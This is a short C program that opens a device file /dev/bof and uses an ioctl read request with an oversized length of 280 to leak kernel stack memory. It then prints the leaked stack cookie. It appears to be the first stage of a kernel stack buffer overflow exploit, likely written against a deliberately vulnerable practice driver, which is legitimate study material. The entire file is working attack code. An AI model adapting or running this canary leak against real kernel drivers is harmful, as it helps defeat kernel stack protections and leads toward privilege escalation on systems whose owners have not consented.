#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

#define WRITE_STACK 0
#define READ_STACK 1

#define MAX_MSG 1024

typedef struct read_write_stack{
	unsigned long size;
	long msg[MAX_MSG];
} read_write_stack;

int main(){
	int fd;
	long ret;

	printf("[+] Opening device file...\n");
	fd = open("/dev/bof", O_RDWR);
	if(fd < 0){
		printf("[-] Failed to open device file\n");
		exit(-1);
	}

	read_write_stack* receiver = (read_write_stack*)malloc(sizeof(unsigned long) + MAX_MSG * sizeof(long));
	receiver->size = 280;

	printf("[+] Trying to read from kernel stack...\n");
	ret = ioctl(fd, READ_STACK, (unsigned long)receiver);
	if(ret < 0){
		printf("[-] Failed to read from kernel stack\n");
		free(receiver);
		exit(-1);
	}

	printf("[+] Received message\n");
	printf("[+] Stack cookie: 0x%lx\n", receiver->msg[128]);
	

	free(receiver);
	
	return 0;
}
